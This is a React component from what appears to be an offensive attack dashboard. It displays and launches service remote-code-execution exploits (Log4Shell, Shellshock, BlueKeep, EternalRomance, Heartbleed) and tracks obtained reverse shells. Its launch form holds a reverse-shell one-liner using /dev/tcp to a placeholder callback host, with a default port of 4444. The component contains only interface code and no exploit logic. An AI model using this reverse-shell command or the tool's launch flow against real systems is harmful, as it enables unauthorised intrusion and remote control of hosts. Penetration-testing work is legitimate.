import type { NetworkAttackData, ServiceRCEResult, ServiceRCEVulnerability } from '../types/network-attack';
import React, { useState } from 'react';
import { cn } from '../../../../../../../shared/lib/utils';

// UI Components
function SectionHeader({ accent = '#0af', children }: { accent?: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center gap-2 mb-2">
      <div className="w-1 h-4 rounded-full" style={{ backgroundColor: accent }} />
      <h3 className="text-[12px] font-bold uppercase tracking-[0.1em] text-[#c8d6f0] font-mono">
        {children}
      </h3>
    </div>
  );
}

function KV({ k, v, vc = 'text-[#c8d6f0]' }: { k: string; v: string | number | React.ReactNode; vc?: string }) {
  return (
    <div className="flex justify-between items-center py-1 border-b border-[#111827] last:border-0">
      <span className="text-[11px] font-mono text-[#c8d6f0] uppercase tracking-wide">{k}</span>
      <span className={cn('text-[12px] font-mono', vc)}>{v}</span>
    </div>
  );
}

function StatBox({ label, value, sub, accent }: { label: string; value: string | number; sub?: string; accent: string }) {
  return (
    <div className="bg-[#0d1017] border border-[#1c2333] rounded p-2.5 flex flex-col gap-0.5">
      <span className="text-[10px] uppercase tracking-widest font-mono text-[#c8d6f0]">{label}</span>
      <span className="text-[16px] font-bold font-mono leading-none" style={{ color: accent }}>
        {value}
      </span>
      {sub && <span className="text-[9px] font-mono text-[#c8d6f0]">{sub}</span>}
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const config: Record<string, { color: string; label: string }> = {
    success: { color: '#30d158', label: 'SUCCESS' },
    failed: { color: '#ff2d55', label: 'FAILED' },
    pending: { color: '#f5a623', label: 'PENDING' },
    running: { color: '#0af', label: 'RUNNING' },
  };
  const c = config[status] || { color: '#4a5a7a', label: status.toUpperCase() };
  return (
    <span className="text-[9px] font-bold font-mono uppercase px-1.5 py-0.5 rounded-sm" style={{ color: c.color, border: `1px solid ${c.color}40`, background: `${c.color}12` }}>
      {c.label}
    </span>
  );
}

function ExpandableRaw({ content }: { content: string }) {
  const [expanded, setExpanded] = React.useState(false);
  const preview = content.split('\n').slice(0, 4).join('\n');

  return (
    <div className="mt-2">
      <pre className="text-[10px] font-mono text-[#5a6a8a] bg-[#0a0e14] p-2 rounded overflow-x-auto whitespace-pre-wrap">
        {expanded ? content : preview}
      </pre>
      {content.split('\n').length > 4 && (
        <button
          onClick={() => setExpanded(!expanded)}
          className="text-[10px] font-mono text-[#0af] hover:text-[#5cf] mt-1"
        >
          {expanded ? 'Show less' : 'Show more'}
        </button>
      )}
    </div>
  );
}

const VULN_LABELS: Record<ServiceRCEVulnerability, { label: string; cve: string; severity: string; description: string }> = {
  log4shell: { label: 'Log4Shell', cve: 'CVE-2021-44228', severity: 'CRITICAL', description: 'Apache Log4j2 JNDI injection leading to RCE' },
  heartbleed: { label: 'Heartbleed', cve: 'CVE-2014-0160', severity: 'HIGH', description: 'OpenSSL heartbeat information leak' },
  shellshock: { label: 'Shellshock', cve: 'CVE-2014-6271', severity: 'CRITICAL', description: 'Bash arbitrary command execution via env variables' },
  smb_eternal_romance: { label: 'Eternal Romance', cve: 'CVE-2017-0145', severity: 'CRITICAL', description: 'SMBv1 remote code execution (NSA leak)' },
  rdp_bluekeep: { label: 'BlueKeep', cve: 'CVE-2019-0708', severity: 'CRITICAL', description: 'RDP remote code execution pre-auth' },
  cve_custom: { label: 'Custom CVE', cve: 'N/A', severity: 'UNKNOWN', description: 'User-specified CVE exploit' },
};

export function ServiceRCE({ data }: { data: NetworkAttackData }) {
  const results = data.serviceRCEResults;
  const successCount = results.filter((r) => r.status === 'success').length;
  const shellsObtained = results.filter((r) => r.shellObtained).length;

  return (
    <div className="flex-1 overflow-y-auto p-3">
      <div className="grid grid-cols-2 gap-2">
        {/* Stat boxes */}
        <div className="col-span-2 grid grid-cols-4 gap-2 mb-1">
          <StatBox label="Total Exploits" value={results.length} sub="service RCE attempts" accent="#0af" />
          <StatBox label="Successful" value={successCount} sub="exploits succeeded" accent="#30d158" />
          <StatBox label="Shells Obtained" value={shellsObtained} sub="reverse shells" accent="#ff2d55" />
          <StatBox label="Open Ports" value={data.openPorts.length} sub="attack surface" accent="#f5a623" />
        </div>

        {/* Service RCE Results */}
        {results.length === 0 ? (
          <div className="col-span-2 bg-[#0d1017] border border-[#1c2333] rounded p-6 text-center">
            <div className="text-[32px] opacity-15 mb-2">⚡</div>
            <div className="text-[11px] font-mono text-[#c8d6f0]">No service RCE exploits run yet</div>
            <div className="text-[10px] font-mono text-[#2a3548] mt-1">Supported: Log4Shell, Heartbleed, Shellshock, BlueKeep, Eternal Romance</div>
          </div>
        ) : (
          results.map((result, idx) => {
            const vulnInfo = VULN_LABELS[result.config.vulnerability];
            return (
              <div key={idx} className="bg-[#0d1017] border border-[#1c2333] rounded p-3 col-span-2">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    <SectionHeader accent={result.status === 'success' ? '#30d158' : '#ff2d55'}>
                      {vulnInfo.label}
                    </SectionHeader>
                    <StatusBadge status={result.status} />
                  </div>
                  <span className="text-[10px] font-mono text-[#c8d6f0]">
                    {new Date(result.timestamp).toLocaleString()}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2">
                  {/* Config Card */}
                  <div className="bg-[#0a0e14] border border-[#111827] rounded p-2">
                    <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Exploit Configuration</div>
                    <KV k="CVE" v={vulnInfo.cve} vc="text-[#ff2d55]" />
                    <KV k="Target" v={`${result.config.target}:${result.config.port}`} vc="text-[#0af]" />
                    <KV k="Severity" v={vulnInfo.severity} vc="text-[#ff2d55]" />
                    {result.config.callbackHost && (
                      <KV k="Callback" v={`${result.config.callbackHost}:${result.config.callbackPort}`} vc="text-[#30d158]" />
                    )}
                  </div>

                  {/* Result Card */}
                  <div className="bg-[#0a0e14] border border-[#111827] rounded p-2">
                    <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Attack Result</div>
                    <KV
                      k="Shell Obtained"
                      v={result.shellObtained ? 'YES ✓' : 'NO ✗'}
                      vc={result.shellObtained ? 'text-[#30d158]' : 'text-[#ff2d55]'}
                    />
                    {result.reverseShell && (
                      <>
                        <KV k="Shell Type" v={result.reverseShell.type} vc="text-[#f5a623]" />
                        <KV k="Callback" v={`${result.reverseShell.host}:${result.reverseShell.port}`} vc="text-[#30d158]" />
                      </>
                    )}
                    {result.commandOutput && (
                      <KV k="Command Output" v={result.commandOutput} vc="text-[#c8d6f0]" />
                    )}
                    {result.duration && (
                      <KV k="Duration" v={`${(result.duration / 1000).toFixed(1)}s`} />
                    )}
                  </div>
                </div>

                {/* Description */}
                <div className="mt-2 bg-[#0a0e14] border border-[#111827] rounded p-2">
                  <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Vulnerability Description</div>
                  <div className="text-[11px] font-mono text-[#c8d6f0]">{vulnInfo.description}</div>
                </div>

                {/* Output */}
                {result.output && (
                  <div className="mt-2 bg-[#0a0e14] border border-[#111827] rounded p-2">
                    <div className="text-[10px] font-mono text-[#c8d6f0] uppercase mb-1">Output</div>
                    <ExpandableRaw content={result.output} />
                  </div>
                )}
              </div>
            );
          })
        )}

        {/* Attack Configuration Form */}
        <div className="bg-[#0d1017] border border-[#1c2333] rounded p-3 col-span-2">
          <SectionHeader accent="#ff2d55">Launch Service RCE</SectionHeader>
          <div className="grid grid-cols-2 gap-2 mb-2">
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Vulnerability</label>
              <select className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#c8d6f0] outline-none">
                <option value="log4shell">Log4Shell (CVE-2021-44228)</option>
                <option value="shellshock">Shellshock (CVE-2014-6271)</option>
                <option value="heartbleed">Heartbleed (CVE-2014-0160)</option>
                <option value="smb_eternal_romance">Eternal Romance (CVE-2017-0145)</option>
                <option value="rdp_bluekeep">BlueKeep (CVE-2019-0708)</option>
              </select>
            </div>
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Target Port</label>
              <input
                type="number"
                defaultValue={8080}
                className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#0af] outline-none placeholder:text-[#2a3548]"
                style={{ caretColor: '#0af' }}
              />
            </div>
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Callback Host</label>
              <input
                type="text"
                placeholder="192.168.1.100"
                className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#30d158] outline-none placeholder:text-[#2a3548]"
                style={{ caretColor: '#30d158' }}
              />
            </div>
            <div>
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Callback Port</label>
              <input
                type="number"
                defaultValue={4444}
                className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#30d158] outline-none placeholder:text-[#2a3548]"
                style={{ caretColor: '#30d158' }}
              />
            </div>
            <div className="col-span-2">
              <label className="text-[10px] font-mono text-[#c8d6f0] uppercase block mb-1">Custom Command</label>
              <input
                type="text"
                placeholder="bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
                className="w-full h-7 bg-[#040608] border border-[#1c2333] rounded px-2 text-[11px] font-mono text-[#c8d6f0] outline-none placeholder:text-[#2a3548]"
                style={{ caretColor: '#c8d6f0' }}
              />
            </div>
          </div>
          <button className="h-8 px-4 rounded text-[11px] font-bold font-mono transition-colors" style={{ background: '#ff2d5515', border: '1px solid #ff2d5530', color: '#ff2d55' }}>
            ⚡ Launch Exploit
          </button>
        </div>
      </div>
    </div>
  );
}